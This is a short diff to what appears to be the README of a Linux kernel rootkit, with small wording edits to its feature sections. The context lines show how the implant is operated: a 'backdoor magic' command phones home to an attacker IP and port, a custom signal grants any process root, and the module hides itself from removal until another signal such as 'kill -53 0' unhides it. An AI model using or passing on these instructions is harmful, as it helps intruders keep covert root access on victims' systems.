@@ -45,7 +45,7 @@ Using the default backdoor magic, that would look something like this:
 3tph0n3h0m3(evil_ip:evil_port)
 ```
 
-#### Privilege Escalation
+#### Privilege Escalation Backdoor
 You can give any process root by sending it the `SIGNAL_GIVE_ROOT` signal.
 
 ```
@@ -59,7 +59,7 @@ root
 ```
 
 #### Removal
-Since the kernel module is hidden and unremovable by default, you will need to unhide it so that it can be removed. To do this simply signal any process with `SIGNAL_UNHIDE_MODULE` and then you should be able to remove the module normally.
+Since the kernel module is hidden and thus unremovable by default, you will need to unhid before it can be removed. To do this simply signal any process with `SIGNAL_UNHIDE_MODULE` and then you should be able to remove the module normally.
 
 ```
 > kill -53 0
